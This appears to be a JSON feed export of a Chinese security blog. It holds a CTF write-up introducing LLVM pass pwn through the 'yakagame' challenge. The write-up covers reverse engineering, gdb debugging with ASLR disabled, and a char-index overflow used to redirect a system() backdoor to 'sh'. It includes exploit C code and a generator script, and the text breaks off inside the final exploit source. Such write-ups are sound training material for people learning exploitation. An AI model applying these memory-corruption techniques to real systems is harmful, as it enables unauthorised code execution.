{
    "version": "https://jsonfeed.org/version/1",
    "title": "-NIYAH- • All posts by \"pwn\" tag",
    "description": "Niyah",
    "home_page_url": "http://niyah.cn",
    "items": [
        {
            "id": "http://niyah.cn/CTF/llvm%20pass%E5%85%A5%E9%97%A8/",
            "url": "http://niyah.cn/CTF/llvm%20pass%E5%85%A5%E9%97%A8/",
            "title": "llvm pass入门",
            "date_published": "2022-08-15T16:00:00.000Z",
            "content_html": "<blockquote>\n<p>都什么年代还在做传统 pwn 题，来通过几道题目来入门 llvm pass pwn</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"llvm-pass-pwn入门\"><a class=\"markdownIt-Anchor\" href=\"#llvm-pass-pwn入门\">#</a> llvm pass pwn 入门</h1>\n<p>都什么年代还在做传统 pwn 题，来通过几道题目来入门 llvm pass pwn</p>\n<h2 id=\"环境配置\"><a class=\"markdownIt-Anchor\" href=\"#环境配置\">#</a> 环境配置</h2>\n<p><code>ubuntu18</code>  下安装 clang-8 环境</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">apt-get install -y clang++-8 libc++-8-dev libc++abi-8-dev</code></pre>\n<h2 id=\"yakagame\"><a class=\"markdownIt-Anchor\" href=\"#yakagame\">#</a> yakagame</h2>\n<h3 id=\"分析处理逻辑\"><a class=\"markdownIt-Anchor\" href=\"#分析处理逻辑\">#</a> 分析处理逻辑</h3>\n<p>对.so 文件进行逆向</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812100508092.png\" alt=\"image-20220812100508092\"></p>\n<p>得到函数名如下</p>\n<blockquote>\n<p>gamestart</p>\n<p>fight</p>\n<p>merge</p>\n<p>destroy</p>\n<p>upgrade</p>\n<p>wuxiangdeyidao</p>\n<p>zhanjinniuza</p>\n<p>guobapenhuo</p>\n<p>tiandongwanxiang</p>\n</blockquote>\n<p>一眼原，另外，在处理完这些函数之后，程序还对其他函数名的函数进行了处理，这里对其他函数的处理又涉及了另一个全局的数组 <code>funMap</code> ，说实话看到这里我有点懵，c++ 的我直接有点看不懂，没办法，看不懂的直接调试，这里先放着，先去看看其他函数</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812101204204.png\" alt=\"image-20220812101204204\"></p>\n<p>首先是 <code>fight</code>  函数</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812102407752.png\" alt=\"image-20220812102407752\"></p>\n<blockquote>\n<p>这里还是比较友好的，首先拿到一个参数作为 index，之后通过 index 从 <code>weaponlist</code>  拿到一个值，之后和 <code>boss</code>  这个全局变量进行比较</p>\n</blockquote>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812102804574.png\" alt=\"image-20220812102804574\"></p>\n<p>如果拿出来的值扣去 boss 血量大于 <code>0x12345678</code>  时就执行后门，后面里边有 <code>system</code>  函数的调用</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812151826692.png\" alt=\"image-20220812151826692\"></p>\n<p>个人感觉通过正常流程执行到这个后门是有可能的</p>\n<p>其次是 <code>merge</code>  函数</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812103033447.png\" alt=\"image-20220812103033447\"></p>\n<blockquote>\n<p>将两个参数当成 index ，作为 <code>weaponlist</code>  的索引实现 add 操作</p>\n</blockquote>\n<p>然后是 <code>destroy</code>  函数</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812103232473.png\" alt=\"image-20220812103232473\"></p>\n<blockquote>\n<p>将参数当成 index ，作为 <code>weaponlist</code>  的索引实现置 0 操作</p>\n</blockquote>\n<p>之后是 <code>upgrade</code>  函数</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812103429021.png\" alt=\"image-20220812103429021\"></p>\n<blockquote>\n<p>将 <code>weaponlist</code>  每个字节加上参数的值</p>\n</blockquote>\n<p>最后是 <code>原味</code> 函数</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812103548263.png\" alt=\"image-20220812103548263\"></p>\n<blockquote>\n<p>一队四个人，还挺严谨，都是减去 boss 血量之后对 cmd 也就是后门的参数进行操作</p>\n</blockquote>\n<p>看到这里，我个人的思路主要在于 <code>merge</code>  操作，这个操作里似乎看起来好像没有对 index 做限制，因此似乎可以随意修改全局变量的值？？可以看到，这些全局变量都贴的比较近，有没有一种可能，可以通过 <code>merge</code>  对这些全局变量进行控制呢？</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812104308236.png\" alt=\"image-20220812104308236\"></p>\n<p>另外，还有最后一个处理流程是怎样的呢，带着这两个疑问，我们进入调试</p>\n<h3 id=\"调试与分析\"><a class=\"markdownIt-Anchor\" href=\"#调试与分析\">#</a> 调试与分析</h3>\n<p>首先写一个简单的测试把所有函数都用上尝试一下</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">wuxiangdeyidao</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">zhanjinniuza</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">guobapenhuo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">tiandongwanxiang</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">upgrade</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fight</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">gamestart</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">wuxiangdeyidao</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">zhanjinniuza</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">guobapenhuo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">tiandongwanxiang</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">upgrade</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">fight</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>处理并运行一下</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">clang-8 -emit-llvm -S exp.c -o exp.ll\n.&#x2F;opt-8 -load .&#x2F;yaka.so -ayaka .&#x2F;exp.ll</code></pre>\n<p>效果如下</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812105250789.png\" alt=\"image-20220812105250789\"></p>\n<p>这里的函数只有  <code>upgrade</code>  和  <code>fight</code>  有回显，也看不出什么来，有不得不调试的理由了呢</p>\n<p>由于直接调试的是 opt 文件，因此要等.so 文件加载出来后才可以进行调试</p>\n<p>先把  <code>aslr</code>  关了方便调试</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</code></pre>\n<p>运行得到 <code>yaka.so</code>  的起始地址</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812112911487.png\" alt=\"image-20220812112911487\"></p>\n<p>程序还是要先进入 opt 的，首先将断点下在 main 函数，找到什么时候加载 <a href=\"http://yaka.so\">yaka.so</a>，之后将断点下在该位置，然后就可以在 <code>yaka.so</code>  里下断点了，这里直接在  <code>yaka.so</code>  的  <code>fight</code>  处理模块下断点</p>\n<blockquote>\n<p>断点一 ：0x4b8e0e</p>\n<p>断点二 ：0xCAD7+0x7ffff238e000</p>\n</blockquote>\n<p>之后查看关键全局变量，注意看，测试的 merge (-1,0) 貌似没有操作，但是在  <code>weaponlist</code>  最后有个 0xa0，这个应该就是  <code>merge</code>  操作后的结果，-1 被处理成 0xff 了</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812114818735.png\" alt=\"image-20220812114818735\"></p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812115832005.png\" alt=\"image-20220812115832005\"></p>\n<p>负向溢出不行，正向溢出经尝试也不行，因此还是得看最后的函数处理</p>\n<blockquote>\n<p>断点一 ：0x4b8e0e</p>\n<p>断点二 ：0xD12E+0x7ffff238e000</p>\n</blockquote>\n<p>随便写个函数</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">wuxiangdeyidao</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">zhanjinniuza</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">guobapenhuo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">tiandongwanxiang</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">upgrade</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fight</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">aaaa</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">bbbb</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">gamestart</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">aaaa</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">bbbb</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>神踏马居然过了，原来写啥样的都行，只要是 c 语言函数库以外的就行</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812120714995.png\" alt=\"image-20220812120714995\"></p>\n<p>但是貌似没用，现在的关键是如何进到下面对 weaponlist 有操作的分支</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812121801201.png\" alt=\"image-20220812121801201\"></p>\n<p>不过 c 嘉嘉的看起来真的是一坨，再调试一下，运行之后发现原本为空的  <code>funMap</code>  有了内容</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812125740845.png\" alt=\"image-20220812125740845\"></p>\n<p>再 continue 到下次运行到此处， <code>funMap</code>  内容已经有了更新，并且以某种链表的形式串了起来</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812125921904.png\" alt=\"image-20220812125921904\"></p>\n<p>那么可以猜测，程序遇到不认识的函数就会用 <code>funMap</code>  存起来</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">wuxiangdeyidao</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">zhanjinniuza</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">guobapenhuo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">tiandongwanxiang</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">upgrade</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fight</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">aaaa</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">bbbb</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">gamestart</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">aaaa</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">bbbb</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">aaaa</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">aaaa</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>更新一下脚本，再次运行，这样就大概弄清楚了，遇到不认识的函数，首先会查 <code>funMap</code>  表，如果里面有就进入 <code>weaponlist</code>  的操作流程，如果没有就存起来</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812130234313.png\" alt=\"image-20220812130234313\"></p>\n<p>接着进去看看 <code>weaponlist</code>  被赋值成了什么</p>\n<blockquote>\n<p>断点二：0xD1C5+0x7ffff238e000</p>\n</blockquote>\n<p>貌似是被赋值成为了函数里的参数，更新一下脚本</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">wuxiangdeyidao</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">zhanjinniuza</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">guobapenhuo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">tiandongwanxiang</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">upgrade</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fight</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">aaaa</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">bbbb</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">gamestart</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">aaaa</span><span class=\"token punctuation\">(</span><span class=\"token number\">77</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">bbbb</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">aaaa</span><span class=\"token punctuation\">(</span><span class=\"token number\">77</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">bbbb</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">aaaa</span><span class=\"token punctuation\">(</span><span class=\"token number\">77</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">fight</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>再次断点调试，成功写入</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812131949975.png\" alt=\"image-20220812131949975\"></p>\n<p>但是貌似每个函数只能用一次？</p>\n<p>之后发现，map 搜索到函数所用的次数就是 index，而这个 map 是通过函数名字符串来索引的，换句话说，插入 map 表的函数的位置就是调用时被写入的 index，也就是说，不是这个函数只能用一次，而是这个函数用几次效果都一样，都只能写到对应位置</p>\n<h3 id=\"攻击\"><a class=\"markdownIt-Anchor\" href=\"#攻击\">#</a> 攻击</h3>\n<p>我们再次回到那个循环，可以看到循环的这个 idx 仅仅是 char 类型</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812140225145.png\" alt=\"image-20220812140225145\"></p>\n<p>而 char 类型的范围是  <code>-128 ~ +127</code> ，因此只要 map 表足够长，循环足够多的次数，就可以实现负向溢出了，用 python 生成一下 0x100 个函数名，实现 -0x80 到 0xff 的控制</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> os\n\nstr1 <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    str1 <span class=\"token operator\">+=</span> <span class=\"token string\">'void fun&#123;0:03&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'(int a);\\n'</span>\n\nstr2 <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    str2 <span class=\"token operator\">+=</span> <span class=\"token string\">'fun&#123;0:03&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'(0);\\n'</span>\n\n\n<span class=\"token comment\"># print(str1)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>str2<span class=\"token punctuation\">)</span></code></pre>\n<p>我们再来看看关键的全局变量，这些实际上都是指针，怎么办呢，我们可以找个 <code>sh</code>  字符串来替换 cmd，可以看到， <code>opt-8</code>  程序没有开 pie，因此可以直接在这里找 sh 字符串</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812141233258.png\" alt=\"image-20220812141233258\"></p>\n<p>很经典的 fflush 函数</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812141427940.png\" alt=\"image-20220812141427940\"></p>\n<blockquote>\n<p>addr : 0x6efdad</p>\n</blockquote>\n<p>最后是  <code>score</code>  ，我们再回到 fight 这个地方，你会发现，就算是 loss 也会执行最后的判断，因此不是强迫症我们根本不需要管前面的玩意</p>\n<p>再看下这个比较，把  <code>score</code>  里的东西作为 __int64 指针解析，那么我们只需要改一下指针的偏移，让他随便指向一个地址即可过检查了</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812142754246.png\" alt=\"image-20220812142754246\"></p>\n<p>这个时候又想到了  <code>opt-8</code>  这个程序，里面的  <code>got</code>  表他不就是指向了一个地址吗，我们随便弄一个过来用</p>\n<blockquote>\n<p>addr : 0x77dfd8</p>\n</blockquote>\n<p>写入成功</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812145212710.png\" alt=\"image-20220812145212710\"></p>\n<p>都到这里也不需要调了，攻击成功</p>\n<p><img src=\"/CTF/llvm%20pass%E5%85%A5%E9%97%A8/image-20220812143726920.png\" alt=\"image-20220812143726920\"></p>\n<p>脚本</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">wuxiangdeyidao</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">zhanjinniuza</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">guobapenhuo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">tiandongwanxiang</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">upgrade</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fight</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun000</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun001</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun002</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun003</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun004</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun005</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun006</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun007</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun008</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun009</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun010</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun011</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun012</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun013</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun014</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun015</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">fun016</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span 